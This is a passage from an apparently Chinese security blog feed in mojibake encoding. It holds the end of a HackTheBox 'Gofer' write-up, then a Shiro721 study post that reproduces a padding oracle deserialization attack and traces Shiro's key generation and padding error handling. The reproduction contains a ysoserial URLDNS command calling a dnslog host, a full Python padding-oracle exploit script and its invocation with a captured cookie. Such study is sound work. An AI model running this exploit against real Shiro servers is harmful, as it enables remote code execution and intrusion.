title="ÊâìÂÆåÊÑüÊÇü"></a>ÊâìÂÆåÊÑüÊÇü</h2><p>Á¨¨‰∏ÄÊ¨°Á¢∞htbÁöÑÈù∂Êú∫ÔºåÁ°ÆÂÆûÂæàÂ§ö‰∏úË•ø‰∏ç‰ºöÔºåwpÊ≤°Âá∫Êù•‰πãÂâçÁ¨¨‰∏ÄÊ≠•Â∞±‰∏ç‰ºö„ÄÇ„ÄÇ„ÄÇÊèêÊùÉÈÇ£ÈáåÁöÑÂèçÂºπshellÊêû‰∫ÜÂá†‰∏™Â∞èÊó∂ÈÉΩ‰∏çË°åÔºåÂêéÈù¢Êç¢‰∏™Á´ØÂè£Â•Ω‰∫Ü„ÄÇ„ÄÇ„ÄÇÂ∏àÂÇÖ‰ª¨ÂèØ‰ª•ÂèÇËÄÉ‰∏ãÈù¢ÁöÑËøô‰∏™ËßÜÈ¢ëÂ∞ÜËÆ≤ÁöÑÂæàËØ¶ÁªÜÁâπÂà´ÊòØÈÄÜÂêëÈÇ£ÈáåÔºåÂè¶Â§ñ‰πüÊÑüË∞¢userB1ankÂ∏àÂÇÖÁöÑÊåáÂØº</p><h2 id="ÂèÇËÄÉÔºö"><a href="#ÂèÇËÄÉÔºö" class="headerlink" title="ÂèÇËÄÉÔºö"></a>ÂèÇËÄÉÔºö</h2><p><a href="https://www.bilibili.com/video/BV1gz4y1s7Hy/?spm_id_from=333.337.search-card.all.click&vd_source=1890d9406dbe84d302711ac2df955425">Gofer - Hackthebox_ÂìîÂì©ÂìîÂì©_bilibili</a><br><a href="http://userb1ank.xyz/2023/08/01/%E9%9D%B6%E5%9C%BA/gofer/">gofer-wp | UserB1ank‚Äôs Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> Ê∏óÈÄè </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaÂ≠¶‰π†‰πãShiro721</title>
      <link href="/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BShiro721/"/>
      <url>/2023/07/Java%E5%AD%A6%E4%B9%A0%E4%B9%8BShiro721/</url>
      
        <content type="html"><![CDATA[<h2 id="ÁéØÂ¢É"><a href="#ÁéØÂ¢É" class="headerlink" title="ÁéØÂ¢É"></a>ÁéØÂ¢É</h2><p>ËøôÈáåÊàëÁõ¥Êé•Áî®ÁöÑDrunkbaby‰Ω¨ÁöÑÁéØÂ¢ÉÔºåËá™Â∑±Êê≠Âª∫Â§±Ë¥•‰∫ÜÔºåÊ∑¶</p><h2 id="ÊºèÊ¥ûÂéüÁêÜ"><a href="#ÊºèÊ¥ûÂéüÁêÜ" class="headerlink" title="ÊºèÊ¥ûÂéüÁêÜ"></a>ÊºèÊ¥ûÂéüÁêÜ</h2><p>Âú®Shiro721ÊºèÊ¥û‰∏≠ÔºåÁî±‰∫éApache Shiro cookie‰∏≠ÈÄöËøá AES-128-CBC Ê®°ÂºèÂä†ÂØÜÁöÑrememberMeÂ≠óÊÆµÂ≠òÂú®ÈóÆÈ¢òÔºåÁî®Êà∑ÂèØÈÄöËøáPadding Oracle AttackÊù•ÊûÑÈÄ†ÊÅ∂ÊÑèÁöÑrememberMeÂ≠óÊÆµÔºåÂπ∂ÈáçÊñ∞ËØ∑Ê±ÇÁΩëÁ´ôÔºåËøõË°åÂèçÂ∫èÂàóÂåñÊîªÂáªÔºåÊúÄÁªàÂØºËá¥‰ªªÊÑè‰ª£Á†ÅÊâßË°å„ÄÇ</p><p>ËôΩÁÑ∂‰ΩøÁî®Padding Oracle AttackÂèØ‰ª•ÁªïËøáÂØÜÈí•Áõ¥Êé•ÊûÑÈÄ†ÊîªÂáªÂØÜÊñáÔºå‰ΩÜÊòØÂú®ËøõË°åÊîªÂáª‰πãÂâçÊàë‰ª¨ÈúÄË¶ÅËé∑Âèñ‰∏Ä‰∏™ÂêàÊ≥ïÁî®Êà∑ÁöÑCookie„ÄÇ</p><h2 id="ÊºèÊ¥ûÂà©Áî®Êù°‰ª∂"><a href="#ÊºèÊ¥ûÂà©Áî®Êù°‰ª∂" class="headerlink" title="ÊºèÊ¥ûÂà©Áî®Êù°‰ª∂"></a>ÊºèÊ¥ûÂà©Áî®Êù°‰ª∂</h2><p>ÊºèÊ¥ûÂΩ±ÂìçÁâàÊú¨ÊòØ 1.2.5 &lt;&#x3D; Apache Shiro &lt;&#x3D; 1.4.1<br>Apache Shiro Padding Oracle Attack ÁöÑÊºèÊ¥ûÂà©Áî®ÂøÖÈ°ªÊª°Ë∂≥Â¶Ç‰∏ãÂâçÊèêÊù°‰ª∂Ôºö</p><ul><li>ÂºÄÂêØ rememberMe ÂäüËÉΩÔºõ</li><li>rememberMe ÂÄº‰ΩøÁî® AES-CBC Ê®°ÂºèËß£ÂØÜÔºõ</li><li>ËÉΩËé∑ÂèñÂà∞Ê≠£Â∏∏ CookieÔºåÂç≥Áî®Êà∑Ê≠£Â∏∏ÁôªÂΩïÁöÑ Cookie ÂÄºÔºõ</li><li>ÂØÜÊñáÂèØÊéßÔºõ</li></ul><h2 id="Â§çÁé∞ÊºèÊ¥û"><a href="#Â§çÁé∞ÊºèÊ¥û" class="headerlink" title="Â§çÁé∞ÊºèÊ¥û"></a>Â§çÁé∞ÊºèÊ¥û</h2><p>ËøôÈáåÂÖàÊ≠£Â∏∏ÁôªÂΩïÔºåÁÑ∂ÂêéÊäì‰∏™ÁôªÂΩïÂêéÁöÑÂåÖÔºåËøôÈáåËøòÊòØÂíå‰πãÂâç‰∏ÄÊ†∑ÂæóÁî®Ëá™Â∑±ÁöÑIPÊâçËÉΩÊäìÂà∞<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171131964.png" alt="image-20230717113123897"><br>ÁÑ∂ÂêéÂà©Áî®ysoÂ∑•ÂÖ∑ÁîüÊàê‰∏Ä‰∏™<code>payload.class</code>Êñá‰ª∂</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java8 -jar ysoserial-all.jar URLDNS <span class="string">&quot;http://1ovhi7.dnslog.cn&quot;</span> &gt; payload.class</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂà©Áî®[Â¶Ç‰∏ãexp](<a href="https://github.com/inspiringz/Shiro-721">inspiringz&#x2F;Shiro-721: Shiro-721 RCE Via RememberMe Padding Oracle Attack (github.com)</a>)ËøõË°åPadding Oracle AttackÔºö</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#https://github.com/3ndz/Shiro-721  </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-  </span></span><br><span class="line"><span class="keyword">from</span> paddingoracle <span class="keyword">import</span> BadPaddingException, PaddingOracle  </span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode  </span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> quote, unquote  </span><br><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> socket  </span><br><span class="line"><span class="keyword">import</span> time  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PadBuster</span>(<span class="title class_ inherited__">PaddingOracle</span>):  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, **kwargs</span>):  </span><br><span class="line">        <span class="built_in">super</span>(PadBuster, self).__init__(**kwargs)  </span><br><span class="line">        self.session = requests.Session()  </span><br><span class="line">        self.wait = kwargs.get(<span class="string">&#x27;wait&#x27;</span>, <span class="number">2.0</span>)  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">oracle</span>(<span class="params">self, data, **kwargs</span>):  </span><br><span class="line">        somecookie = b64encode(b64decode(unquote(sys.argv[<span class="number">2</span>])) + data)  </span><br><span class="line">        self.session.cookies[<span class="string">&#x27;rememberMe&#x27;</span>] = somecookie  </span><br><span class="line">        <span class="keyword">if</span> self.session.cookies.get(<span class="string">&#x27;JSESSIONID&#x27;</span>):  </span><br><span class="line">            <span class="keyword">del</span> self.session.cookies[<span class="string">&#x27;JSESSIONID&#x27;</span>]  </span><br><span class="line">        <span class="keyword">while</span> <span class="number">1</span>:  </span><br><span class="line">            <span class="keyword">try</span>:  </span><br><span class="line">                response = self.session.get(sys.argv[<span class="number">1</span>],  </span><br><span class="line">                        stream=<span class="literal">False</span>, timeout=<span class="number">5</span>, verify=<span class="literal">False</span>)  </span><br><span class="line">                <span class="keyword">break</span>  </span><br><span class="line">            <span class="keyword">except</span> (socket.error, requests.exceptions.RequestException):  </span><br><span class="line">                logging.exception(<span class="string">&#x27;Retrying request in %.2f seconds...&#x27;</span>,  </span><br><span class="line">                                  self.wait)  </span><br><span class="line">                time.sleep(self.wait)  </span><br><span class="line">                <span class="keyword">continue</span>  </span><br><span class="line">  </span><br><span class="line">        self.history.append(response)  </span><br><span class="line">        <span class="keyword">if</span> response.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>) <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> <span class="string">&#x27;deleteMe&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> response.headers.get(<span class="string">&#x27;Set-Cookie&#x27;</span>):  </span><br><span class="line">            logging.debug(<span class="string">&#x27;No padding exception raised on %r&#x27;</span>, somecookie)  </span><br><span class="line">            <span class="keyword">return</span>  </span><br><span class="line">        <span class="keyword">raise</span> BadPaddingException  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:  </span><br><span class="line">    <span class="keyword">import</span> logging  </span><br><span class="line">    <span class="keyword">import</span> sys  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> sys.argv[<span class="number">3</span>:]:  </span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;Usage: %s &lt;url&gt; &lt;somecookie value&gt; &lt;payload&gt;&#x27;</span> % (sys.argv[<span class="number">0</span>], )  </span><br><span class="line">        sys.exit(<span class="number">1</span>)  </span><br><span class="line">  </span><br><span class="line">    logging.basicConfig(level=logging.DEBUG)  </span><br><span class="line">    encrypted_cookie = b64decode(unquote(sys.argv[<span class="number">2</span>]))  </span><br><span class="line">    padbuster = PadBuster()  </span><br><span class="line">    payload = <span class="built_in">open</span>(sys.argv[<span class="number">3</span>], <span class="string">&#x27;rb&#x27;</span>).read()  </span><br><span class="line">    enc = padbuster.encrypt(plaintext=payload, block_size=<span class="number">16</span>)  </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;rememberMe cookies:&#x27;</span>)  </span><br><span class="line">    <span class="built_in">print</span>(b64encode(enc))</span><br></pre></td></tr></table></figure><p>Ëøô‰∏™ËÑöÊú¨ÈúÄË¶Åpython2Êù•ËøêË°åÔºåÁÑ∂ÂêépaddingoracleËøô‰∏™Â∫ìÁõ¥Êé•Âú®‰∏äÈù¢ÈÇ£‰∏™È°πÁõÆÈáåÈù¢‰∏ãËΩΩÁÑ∂ÂêéÊîæÂà∞python2ÂØπÂ∫îÁöÑÂ∫ìÂ≠òÊîæ‰ΩçÁΩÆÂ∞±Ë°åÔºåÊàëÁöÑÂú∞ÂùÄÂ¶Ç‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171131460.png" alt="image-20230717113137408"><br>ÁÑ∂ÂêéËøêË°åËÑöÊú¨ÁàÜÁ†¥Â∞±Ë°å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 exp.py http://<span class="number">172.21</span><span class="number">.97</span><span class="number">.44</span>:<span class="number">8081</span>/shiro721_war/account/ nAIv7BZvX7caZvpwmOXX081j1JGGQGBL936tN9gkgCcymvbHnt7Vgj8Alu7pBZSwFHbbUa776DI4T1WGeJ7YguSZOLuinOaIW1iHjwi0P1YFNcf0ZIYTimmKL0u3tWeGpTS276V9WqdYhd1oCsI7R/4wlZ28rodMjoNeADon742+JG4Mbj6ihQKNBL+mklXa/+u5tpd6NfbEbASAFSlQ8H/MdbwzhqVXyMOvteNR26adkcWJKZDhKBy5GE68fPi7OHWcSVsl6ZZUMTAZcsIiwzg9O/XDUEkAzK1TMEf3iibRbHhfD6jzNorfcEM9DZTZ6trEX8+TFHc6DHyVZE8I6De6+Iyq3Ysr0N222YRwc2uYc2UYMrZPho1p/JheNPJGN+DolcM03d8HxJF4tSDepkvn8uYzjps+U+h++zqAqWrkkDzG7vTJP7Zo9Z5YONCSuYRq3k7vL0sqoO+PRQ+18JNAOYi2Jjlu0y3JpYX1eROnIbVMp1lF81d9UIgueJuT payload.<span class="keyword">class</span></span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéÂà©Áî®ÁàÜÁ†¥ÁîüÊàêÁöÑcookieÂéªÊâìDNSÂ∞±Ë°åÔºåËÑöÊú¨‰ΩúËÄÖËØ¥Â∑Æ‰∏çÂ§ö‰∏ÄÂ∞èÊó∂ÔºåÂÖ∂ÂÆûËøôÈáåÂ§ßÊ¶ÇÂá†ÂàÜÈíüÂ∞±Ë°å<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171131919.png" alt="image-20230717113145827"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171131549.png" alt="image-20230717113153511"><br>ËøôÈáå‰πüÂèØ‰ª•Âà©Áî®È£ûÈ∏øÂ∏àÂÇÖÁöÑÂ∑•ÂÖ∑ÂéªÊâì‰πüË°å<a href="https://github.com/feihong-cs/ShiroExploit-Deprecated">Shiro550&#x2F;Shiro721 ‰∏ÄÈîÆÂåñÂà©Áî®Â∑•ÂÖ∑</a></p><h2 id="ÊºèÊ¥ûÂàÜÊûê"><a href="#ÊºèÊ¥ûÂàÜÊûê" class="headerlink" title="ÊºèÊ¥ûÂàÜÊûê"></a>ÊºèÊ¥ûÂàÜÊûê</h2><h3 id="ÂØÜÈí•ÁîüÊàê"><a href="#ÂØÜÈí•ÁîüÊàê" class="headerlink" title="ÂØÜÈí•ÁîüÊàê"></a>ÂØÜÈí•ÁîüÊàê</h3><p>Âú®shiro550‰∏≠ÂØÜÈí•ÊòØÁ°¨ÁºñÁ†ÅÔºåÂ¶Ç‰∏ã</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">        <span class="built_in">this</span>.cipherService = <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        setCipherKey(DEFAULT_CIPHER_KEY_BYTES);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Âú®Shiro721‰∏≠ÔºåÂØÜÈí•ÁöÑÁîüÊàêÊñπÂºèÂèò‰∏∫‰∫ÜÂä®ÊÄÅÁîüÊàê</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">AbstractRememberMeManager</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.serializer = <span class="keyword">new</span> <span class="title class_">DefaultSerializer</span>&lt;PrincipalCollection&gt;();</span><br><span class="line">        <span class="type">AesCipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AesCipherService</span>();</span><br><span class="line">        <span class="built_in">this</span>.cipherService = cipherService;</span><br><span class="line">        setCipherKey(cipherService.generateNewKey().getEncoded());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ÁÑ∂ÂêéË∑üËøõË∞ÉËØï‰∏Ä‰∏ãÔºåÊñ≠ÁÇπÂ¶Ç‰∏ãÔºåshiroÈÄöËøá<code>generateNewKey()</code>ÊñπÊ≥ïËé∑ÂèñÂØÜÈí•<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132306.png" alt="image-20230717113207176"><br>ËøõÂÖ•<code>generateNewKey()</code>ÊñπÊ≥ïÔºåËøôÈáåÂàùÂßãÂåñ‰∫Ü‰∏Ä‰∏™KeyGeneratorÂØπË±°ÔºåÂπ∂‰∏îË∞ÉÁî®‰∫Üinit<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132520.png" alt="image-20230717113216295"><br>ÁªßÁª≠Ë∑üËøõÁúãÁúãÔºåËøôÈáåËé∑ÂèñÂà∞‰∫Ü‰∏Ä‰∏™ÈöèÊú∫Êï∞ÂèëÁîüÂô®<code>SecureRandom</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132709.png" alt="image-20230717113226497"><br>ÁÑ∂Âêé‰∏ã‰∏ÄÊ≠•Ë∞ÉÁî®‰∫Ü<code>generateKey()</code>Ë∑üËøõÁúãÁúã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132397.png" alt="image-20230717113235333"><br>Ë∑üËøõ‰πãÂêéÂèëÁé∞ËøôÈáåË∞ÉÁî®‰∫Ü<code>engineGenerateKey()</code>Ë∑üËøõÂéªÂèëÁé∞ÊòØ‰∏™ÊäΩË±°Á±ª‰∏≠ÁöÑÊäΩË±°ÊñπÊ≥ïÔºåÊâæÂà∞ÂÆÉÁöÑÂÆûÁé∞ÔºåÂú®‰∏ãÈù¢ËøôÈáå<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132628.png" alt="image-20230717113244391"><br>Âú®ËøôÈáåÂ∑≤ÁªèÁîüÊàê‰∫Ü‰∏Ä‰∏≤16Â≠óËäÇÁöÑÈöèÊú∫Â∫èÂàóÔºåÁÑ∂ÂêéËøîÂõû‰∏Ä‰∏™<code>SecretKeySpec</code>ÂØπË±°ÔºåÂÜç‰ΩøÁî®<code>getEncoded()</code>ÊñπÊ≥ïËé∑Âèñ<code>key</code>ÂØÜÈí•Â∫èÂàóÔºåÁÑ∂ÂêéÁªßÁª≠Ë∑üÂà∞<code>getEncoded()</code>ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171132164.png" alt="image-20230717113254957"><br>ËøôÊï¥‰∏™ËøáÁ®ãÂ∞±ÊòØÂØÜÈí•ÁîüÊàêÁöÑÂÆåÊï¥ËøáÁ®ãÔºåË∞ÉËØïËÉΩÂäõÂ§™Â∑Æ‰∫ÜÔºå‰∏çÁü•ÈÅìÊòØ‰∏çÊòØÊ≤°‰∏ãÊ∫êÁ†ÅÁöÑÂéüÂõ†ÂæàÂ§öÁ±ªÈÉΩÊòØclassÊñá‰ª∂‰∏çÂ§™Â•ΩË∞ÉÔºåÈÉΩÊòØÁõ¥Êé•‰∏ãÁöÑÊñ≠ÁÇπ</p><h3 id="Padding-Oracle-AttackÊîªÂáª‰∏≠ÁöÑÂ∏ÉÂ∞îÊù°‰ª∂"><a href="#Padding-Oracle-AttackÊîªÂáª‰∏≠ÁöÑÂ∏ÉÂ∞îÊù°‰ª∂" class="headerlink" title="Padding Oracle AttackÊîªÂáª‰∏≠ÁöÑÂ∏ÉÂ∞îÊù°‰ª∂"></a>Padding Oracle AttackÊîªÂáª‰∏≠ÁöÑÂ∏ÉÂ∞îÊù°‰ª∂</h3><p>‰ª•‰∏ãÂÜÖÂÆπÂèÇËÄÉ<a href="https://goodapple.top/archives/261">JavaÂèçÂ∫èÂàóÂåñÊºèÊ¥û‚Äî‚ÄîShiro721 - Êû´„ÅÆBlog (goodapple.top)</a>ÊàëËøôÈáåÂ∞±ÊòØË∑üÁùÄËµ∞‰∏ÄÈÅç<br>Padding Oracle AttackÊîªÂáªÊòØ‰∏ÄÁßçÁ±ª‰ºº‰∫ésqlÁõ≤Ê≥®ÁöÑÊîªÂáªÔºåËøôÂ∞±Ë¶ÅÊ±ÇÊúçÂä°Âô®Á´ØÊúâËÉΩÂ§üË¢´Êàë‰ª¨Âà©Áî®ÁöÑÂ∏ÉÂ∞îÊù°‰ª∂<br>Âú® Apache Shiro ÁöÑÂú∫ÊôØ‰∏≠ÔºåËøô‰∏™ÊúçÂä°Á´ØÁöÑ‰∏§‰∏™‰∏çÂêåÁöÑÂìçÂ∫îÁâπÂæÅ‰∏∫Ôºö</p><ul><li>Padding Oracle ÈîôËØØÊó∂ÔºåÊúçÂä°Á´ØÂìçÂ∫îÊä•ÊñáÁöÑ Set-Cookie Â§¥Â≠óÊÆµËøîÂõû <code>rememberMe=deleteMe</code>Ôºõ</li><li>Padding Oracle Ê≠£Á°ÆÊó∂ÔºåÊúçÂä°Á´ØËøîÂõûÊ≠£Â∏∏ÁöÑÂìçÂ∫îÊä•ÊñáÂÜÖÂÆπÔºõ<br>Êàë‰ª¨ÂèØ‰ª•ÈÄöËøáÂìçÂ∫îÂ§¥Êù•Âà§Êñ≠ÊòéÊñáÂ°´ÂÖÖÊòØÂê¶Ê≠£Á°ÆÔºåËøõËÄåÁàÜÁ†¥Âá∫‰∏≠Èó¥ÂÄº„ÄÇÈÇ£‰πàÂØπ‰∫éËß£ÂØÜ‰∏çÊ≠£Á°ÆÁöÑ CookieÔºåShiro ÊòØÊÄé‰πàÂ§ÑÁêÜÁöÑÂë¢Ôºü</li></ul><h4 id="PaddingÈîôËØØÂ§ÑÁêÜ"><a href="#PaddingÈîôËØØÂ§ÑÁêÜ" class="headerlink" title="PaddingÈîôËØØÂ§ÑÁêÜ"></a>PaddingÈîôËØØÂ§ÑÁêÜ</h4><p>Ëß£ÂØÜÂáΩÊï∞Âú®<code>AbstractRememberMeManager.decrypt()</code>‰∏≠<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171133587.png" alt="image-20230717113306451"><br>Ë∑üËøõ<code>cipherService.decrypt()</code>ÔºåÊúÄÂêéÂà∞<code>crypt()</code>‰∏≠Ë∞ÉÁî®<code>doFinal()</code>ÊñπÊ≥ïÔºåËøôÈáåÊàëÁõ¥Êé•‰∏ãÊñ≠ÁÇπ‰∫ÜÔºå‰∏ÄÊ≠•Ê≠•Ë∞ÉÈóÆÈ¢òÂ§™Â§ö‰∫ÜÔºå‰πüÊúâÂèØËÉΩÊòØÊàëË∞ÉËØïËÉΩÂäõÂ∑Æ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171133802.png"><br><code>doFinal()</code>ÊñπÊ≥ïÊúâ<code>IllegalBlockSizeException</code>Âíå<code>BadPaddingException</code>Ëøô‰∏§‰∏™ÂºÇÂ∏∏ÔºåÂàÜÂà´Áî®‰∫éÊçïËé∑ÂùóÂ§ßÂ∞èÂºÇÂ∏∏ÂíåÂ°´ÂÖÖÈîôËØØÂºÇÂ∏∏„ÄÇÂºÇÂ∏∏‰ºöË¢´ÊäõÂá∫Âà∞<code>crypt()</code>ÊñπÊ≥ï‰∏≠ÔºåÊúÄÁªàË¢´<code>getRememberedPrincipals()</code>ÊñπÊ≥ïÊçïËé∑ÔºåÂπ∂ÊâßË°å<code>onRememberedPrincipalFailure()</code>ÊñπÊ≥ï„ÄÇ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171133742.png" alt="image-20230717113350548"><br><code>onRememberedPrincipalFailure()</code>ÊñπÊ≥ïË∞ÉÁî®‰∫Ü<code>forgetIdentity()</code>„ÄÇËØ•ÊñπÊ≥ï‰ºöË∞ÉÁî®<code>removeFrom()</code>ÔºåÂú®responseÂ§¥ÈÉ®Ê∑ªÂä†Â≠óÊÆµ<code>Set-Cookie: rememberMe=deleteMe</code>„ÄÇ<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171133541.png" alt="image-20230717113359308"><br>ÂÄòËã•PaddingÁªìÊûú‰∏çÊ≠£Á°ÆÁöÑËØùÔºåÂìçÂ∫îÂåÖÂ∞±‰ºöËøîÂõû <code>Set-Cookie: rememberMe=deleteMe</code> „ÄÇ</p><h5 id="PaddingÊ≠£Á°ÆÔºåÂèçÂ∫èÂàóÂåñÂ§ÑÁêÜ"><a href="#PaddingÊ≠£Á°ÆÔºåÂèçÂ∫èÂàóÂåñÂ§ÑÁêÜ" class="headerlink" title="PaddingÊ≠£Á°ÆÔºåÂèçÂ∫èÂàóÂåñÂ§ÑÁêÜ"></a>PaddingÊ≠£Á°ÆÔºåÂèçÂ∫èÂàóÂåñÂ§ÑÁêÜ</h5><p>CBCÊ®°Âºè‰∏ãÁöÑÂàÜÁªÑÂØÜÁ†ÅÔºåÂ¶ÇÊûúÊüê‰∏ÄÁªÑÁöÑÂØÜÊñáË¢´Á†¥ÂùèÔºåÈÇ£‰πàÂú®ÂÖ∂‰πãÂêéÁöÑÂàÜÁªÑÈÉΩ‰ºöÂèóÂà∞ÂΩ±Âìç„ÄÇËøôÊó∂ÂÄôÊàë‰ª¨ÁöÑÂØÜÊñáÂ∞±Êó†Ê≥ïÊ≠£Á°ÆÁöÑË¢´ÂèçÂ∫èÂàóÂåñ‰∫Ü„ÄÇ<br>Shiro‰∏≠ÂÖ≥‰∫éÂèçÂ∫èÂàóÂåñÁöÑÂ§ÑÁêÜÂú®<code>DefaultSerializer</code>Á±ªÁöÑ<code>deserialize()</code>ÊñπÊ≥ï‰∏ã<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171134120.png" alt="image-20230717113411895"><br>Â¶ÇÊûúÂèçÂ∫èÂàóÂåñÁöÑÁªìÊûúÈîôËØØÔºåÂàô‰ºöÊäõÂá∫ÂºÇÂ∏∏„ÄÇÊúÄÂêéÂºÇÂ∏∏‰ªç‰ºöË¢´ <code>getRememberedPrincipals()</code> ÊñπÊ≥ïÂ§ÑÁêÜ„ÄÇÁªßÁª≠ÂæÄ‰∏ãË∑üÂç≥ÂèØÁúãÂà∞Êù•Âà∞‰∫Ü<code>getRememberedPrincipals()</code> ÊñπÊ≥ï<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171134178.png" alt="image-20230717113437985"><br>Ëøô‰πüÂ∞±ÊòØ‰∏äÈù¢ËÆ≤ÁöÑ response ÂåÖÈáå‰ºöÂõûÊòæ 302 ‰∏î <code>rememberMe=deleteMe</code><br>‰ΩÜÊòØÂØπ‰∫é Java Êù•ËØ¥ÔºåÂèçÂ∫èÂàóÂåñÊòØ‰ª• Stream ÁöÑÊñπÂºèÊåâÈ°∫Â∫èËøõË°åÁöÑÔºåÂêëÂÖ∂ÂêéÊ∑ªÂä†ÊàñÊõ¥Êîπ‰∏Ä‰∫õÂ≠óÁ¨¶‰∏≤Âπ∂‰∏ç‰ºöÂΩ±ÂìçÊ≠£Â∏∏ÂèçÂ∫èÂàóÂåñ„ÄÇÂêéÈù¢ÁöÑÊµãËØïÁõ¥Êé•Ë¥¥‰∫Ü‰∏äÈù¢ÈÇ£‰∏™Â§ß‰Ω¨ÁöÑÊµãËØïÂõæ„ÄÇ<br>Ëé∑ÂèñÊ≠£Â∏∏Áî®Êà∑ÁöÑ Cookie Âπ∂‰ΩøÁî®ÂØÜÈí•Ëß£ÂØÜÔºåÂèØ‰ª•ÁúãÂà∞ÊúÄÂêéÂ°´ÂÖÖÁöÑÊï∞ÊçÆ‰∏∫ <code>0x0B</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171134335.png" alt="image-20230717113452298"><br>‰∏ãÈù¢Êàë‰ª¨Â∞ÜÂÖ∂Êõ¥Êîπ‰∏∫ÂÖ∂‰ªñÂêàÊ≥ïÂ°´ÂÖÖÊñπÂºèÔºåÁÑ∂ÂêéÂä†ÂØÜÂèëÈÄÅÂá∫Âéª<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171134246.png" alt="image-20230717113459220"><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202307171135271.png" alt="image-20230717113516223"><br>ÊúçÂä°Âô®Á´ØÊ≠£Â∏∏ÂìçÂ∫îÔºå‰∫éÊòØËøôÈáåÂ∞±ÊûÑÈÄ†Âá∫‰∫ÜÂ∏ÉÂ∞îÊù°‰ª∂</p><ul><li>Padding Ê≠£Á°ÆÔºåÊúçÂä°Âô®Ê≠£Â∏∏ÂìçÂ∫î</li><li>Padding 